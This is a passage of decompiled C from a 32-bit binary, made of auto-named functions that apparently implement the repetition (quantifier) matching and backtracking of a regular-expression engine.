            bVar2 = FUN_0040cb75(*(void **)((int)this + 8),param_1);
            if (!bVar2) break;
            uVar5 = uVar5 + 1;
          } while (uVar5 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar5 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar4;
    uVar4 = uVar4 & 0xffffff00;
  }
  else {
    puVar3 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar3 != (uint *)0x0) {
      *puVar3 = uVar4;
      puVar3[1] = uVar5;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar4 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar4;
}



uint __thiscall FUN_0040f329(void *this,int param_1)

{
  undefined4 uVar1;
  bool bVar2;
  uint *puVar3;
  uint uVar4;
  uint uVar5;
  
  uVar5 = 0;
  uVar4 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    bVar2 = FUN_0040cb94(*(void **)((int)this + 8),param_1);
    if (bVar2) {
      if (*(uint *)(param_1 + 8) == uVar4) {
        uVar5 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar5 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            bVar2 = FUN_0040cb94(*(void **)((int)this + 8),param_1);
            if (!bVar2) break;
            uVar5 = uVar5 + 1;
          } while (uVar5 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar5 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar4;
    uVar4 = uVar4 & 0xffffff00;
  }
  else {
    puVar3 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar3 != (uint *)0x0) {
      *puVar3 = uVar4;
      puVar3[1] = uVar5;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar4 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar4;
}



undefined4 __thiscall FUN_0040f3aa(void *this,int param_1,int param_2)

{
  undefined4 uVar1;
  uint uVar2;
  uint local_8;
  
  local_8 = 0;
  uVar2 = *(uint *)(param_1 + 4);
  if (uVar2 == param_2) {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040f41f;
  }
  else {
    if (param_2 + 1U == param_2) {
      uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar1;
    }
    if (*(uint *)((int)this + 0xc) != 0) {
      local_8 = 1;
      param_2 = param_2 + 1U;
    }
    for (; local_8 < *(uint *)((int)this + 0xc); local_8 = local_8 + 1) {
      if (uVar2 == param_2) goto LAB_0040f41f;
      param_2 = param_2 + 1;
    }
  }
  while( true ) {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)((uint)uVar1 >> 8),1);
    }
    uVar2 = local_8;
    if ((*(uint *)((int)this + 0x10) <= local_8) || (*(uint *)(param_1 + 4) == param_2)) break;
    param_2 = param_2 + 1;
    local_8 = local_8 + 1;
  }
LAB_0040f41f:
  return uVar2 & 0xffffff00;
}



int __thiscall FUN_0040f495(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  bool bVar4;
  uint3 extraout_var;
  int *piVar5;
  uint3 extraout_var_00;
  uint3 uVar6;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  bVar4 = FUN_0040cb75(*(void **)((int)this + 8),uVar3);
  if (bVar4) {
    if (*(int *)(uVar3 + 8) == iVar1) {
      param_1 = *(uint *)((int)this + 0x10);
    }
    else if (*(uint *)((int)this + 0xc) == 0) {
      *(int *)(uVar3 + 8) = iVar1;
    }
    else {
      param_1 = 1;
      if (1 < *(uint *)((int)this + 0xc)) {
        do {
          bVar4 = FUN_0040cb75(*(void **)((int)this + 8),uVar3);
          if (!bVar4) {
            *(int *)(uVar3 + 8) = iVar1;
            uVar6 = extraout_var_00;
            goto LAB_0040f521;
          }
          param_1 = param_1 + 1;
        } while (param_1 < *(uint *)((int)this + 0xc));
      }
    }
  }
  else {
    uVar6 = extraout_var;
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040f521:
      return (uint)uVar6 << 8;
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



int __thiscall FUN_0040f525(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  bool bVar4;
  uint3 extraout_var;
  int *piVar5;
  uint3 extraout_var_00;
  uint3 uVar6;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  bVar4 = FUN_0040cb94(*(void **)((int)this + 8),uVar3);
  if (bVar4) {
    if (*(int *)(uVar3 + 8) == iVar1) {
      param_1 = *(uint *)((int)this + 0x10);
    }
    else if (*(uint *)((int)this + 0xc) == 0) {
      *(int *)(uVar3 + 8) = iVar1;
    }
    else {
      param_1 = 1;
      if (1 < *(uint *)((int)this + 0xc)) {
        do {
          bVar4 = FUN_0040cb94(*(void **)((int)this + 8),uVar3);
          if (!bVar4) {
            *(int *)(uVar3 + 8) = iVar1;
            uVar6 = extraout_var_00;
            goto LAB_0040f5b1;
          }
          param_1 = param_1 + 1;
        } while (param_1 < *(uint *)((int)this + 0xc));
      }
    }
  }
  else {
    uVar6 = extraout_var;
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040f5b1:
      return (uint)uVar6 << 8;
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_0040f5b5(void *this,int param_1)

{
  undefined4 uVar1;
  bool bVar2;
  int iVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar3 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar3 + 4) != *(int *)((int)this + 0x10)) &&
     (bVar2 = FUN_0040cb75(*(void **)((int)this + 8),param_1), bVar2)) {
    *(int *)(iVar3 + 4) = *(int *)(iVar3 + 4) + 1;
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040f616(void *this,int param_1)

{
  undefined4 uVar1;
  bool bVar2;
  int iVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar3 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar3 + 4) != *(int *)((int)this + 0x10)) &&
     (bVar2 = FUN_0040cb94(*(void **)((int)this + 8),param_1), bVar2)) {
    *(int *)(iVar3 + 4) = *(int *)(iVar3 + 4) + 1;
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040f677(void *this,int param_1,int param_2)

{
  int iVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  iVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040d0b0(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = iVar1 - param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040d0b0(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040f700:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040f700;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040f709(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040d0e0(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040d0e0(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040f794:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040f794;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040f79d(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040d10c(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040d10c(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040f81e(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040d141(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040d141(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040f89f(void *this,int param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040d0b0(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040f935;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040d0b0(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040f935;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040d0b0(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040f935:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040f93e(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040d0e0(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040f9d6;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040d0e0(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040f9d6;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040d0e0(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040f9d6:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040f9df(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040d10c(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040fa6b:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040d10c(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_0040fa6b;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_0040fa6f(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040d141(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040fafb:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040d141(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_0040fafb;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_0040faff(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040d10c(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040fb60(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040d141(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0040fbc1(void *this,int param_1,int param_2)

{
  int iVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  iVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040d23e(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = iVar1 - param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040d23e(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040fc4a:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040fc4a;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040fc53(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040d26e(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040d26e(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0040fcde:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0040fcde;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040fce7(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040d29a(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040d29a(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040fd68(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040d2cf(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040d2cf(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0040fde9(void *this,int param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040d23e(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040fe7f;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040d23e(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040fe7f;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040d23e(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040fe7f:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040fe88(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040d26e(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0040ff20;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040d26e(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0040ff20;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040d26e(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0040ff20:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_0040ff29(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040d29a(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_0040ffb5:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040d29a(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_0040ffb5;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
